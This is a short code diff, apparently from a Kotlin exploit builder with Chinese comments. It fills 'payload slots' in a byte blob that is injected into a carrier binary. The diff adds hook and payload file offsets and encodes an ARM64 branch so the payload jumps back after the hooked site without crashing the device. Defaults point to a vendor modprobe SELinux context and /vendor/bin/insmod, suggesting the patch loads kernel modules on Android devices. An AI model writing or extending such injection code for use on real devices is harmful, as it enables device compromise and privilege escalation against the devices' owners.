@@ -176,6 +176,8 @@ class Assembled43284(
     fun fillPayloadSlots(
         blob: ByteArray,
         carrierPath: String,
+        hookFileOffset: Long,      /* 站点文件偏移（site）；hook_vaddr = 它 + 0x4000 */
+        payloadFileOffset: Long,   /* 载荷文件偏移；payload_vaddr = 它 + 0x4000 */
         selinuxContext: String = "u:r:vendor_modprobe:s0",
         insmodPath: String = "/vendor/bin/insmod",
         mutexPath: String = "/dev/dx",  /* 容量 8 字节（≤7 字符 + NUL）；不用 /dev/df：那是 10-05 遗留的陈旧 in-flight 标记，载荷见它会一直等 */
@@ -216,6 +218,18 @@ class Assembled43284(
         val lengthWord = 0xD2800000.toInt() or ((selinuxContext.length and 0xFFFF) shl 5) or 2
         for (index in 0 until 4) {
             blob[0x16C + index] = ((lengthWord shr (index * 8)) and 0xFF).toByte()
+        }
+        /*
+         * 回跳字（blob 的 0x1D4）：载荷做完事要跳回**站点之后**继续执行，与参考 hook_patch.cpp:115-122 同构。
+         * 参考把目标写成 hook_vaddr + 4，自身地址是 payload_vaddr + 0x1D4；vaddr = 文件偏移 + 0x4000。
+         * 不写它，就等于让载荷跳向错处 —— 那是重启的直接来源。
+         */
+        val jumpSelf = payloadFileOffset + 0x4000L + 0x1D4L
+        val jumpTo = hookFileOffset + 0x4000L + 4L
+        val jumpImm = (((jumpTo - jumpSelf) shr 2) and 0x03FFFFFFL).toInt()
+        val jumpWord = 0x14000000 or jumpImm
+        for (index in 0 until 4) {
+            blob[0x1D4 + index] = ((jumpWord shr (index * 8)) and 0xFF).toByte()
         }
         if (displaced != null) {
             for (index in 0 until 4) {
